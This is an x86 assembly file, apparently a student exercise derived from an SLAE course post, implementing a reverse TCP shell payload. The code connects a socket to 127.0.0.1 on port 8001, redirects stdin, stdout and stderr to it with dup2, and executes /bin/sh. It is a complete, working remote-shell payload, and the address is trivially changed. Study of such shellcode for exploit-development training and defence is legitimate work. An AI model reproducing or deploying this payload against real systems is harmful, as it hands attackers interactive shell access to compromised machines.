;Shell Reverse TCP Shellcode 
;
;Derived from: https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/
;
;Authors:
;
; Anthony Troy (14212116)
; Anthony Magann (14211966)
;
;
	.file	"payload.c"
	.section	.rodata
.LC0:
	.string	"127.0.0.1"
.LC1:
	.string	"/bin/sh"
	.text
.globl main
	.type	main, @function
main:
	pushl	%ebp          ;Save the stack-frame base pointer (of the calling function)
	movl	%esp, %ebp    ;Set the stack-frame base pointer to be the current
	andl	$-16, %esp    ;Make room for local vars

	subl	$48, %esp
	movw	$2, 20(%esp)
  ; Set sin_family

	movl	$8001, (%esp)
	call	htons
	movw	%ax, 22(%esp)
  ; Set sin_port

	movl	$.LC0, (%esp)
	call	inet_addr
	movl	%eax, 24(%esp)
  ; Set s_addr

	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp) ; Prepare args for socket function
	call	socket     ; Call socket function
	movl	%eax, 40(%esp)
  ; Set sockfd

	leal	20(%esp), %eax
	movl	$16, 8(%esp)
	movl	%eax, 4(%esp)
	movl	40(%esp), %eax
	movl	%eax, (%esp)
	call	connect
	movl	$0, 36(%esp)
  ; Connect to socket 

	jmp	.L2
  ; Loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
.L3:
	movl	36(%esp), %eax
	movl	%eax, 4(%esp)
	movl	40(%esp), %eax
	movl	%eax, (%esp)
	call	dup2 ;call dup2 with '0' then '1'
	addl	$1, 36(%esp)
.L2:
	cmpl	$2, 36(%esp)
	jle	.L3

	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	$.LC1, (%esp)
	call	execve
  ; Call execve
	leave               ; Put the stack pointer back and restore the calling function's stack frame
	ret                 ; Return to the calling function
	.size	main, .-main
	.ident	"GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-3)"
	.section	.note.GNU-stack,"",@progbits
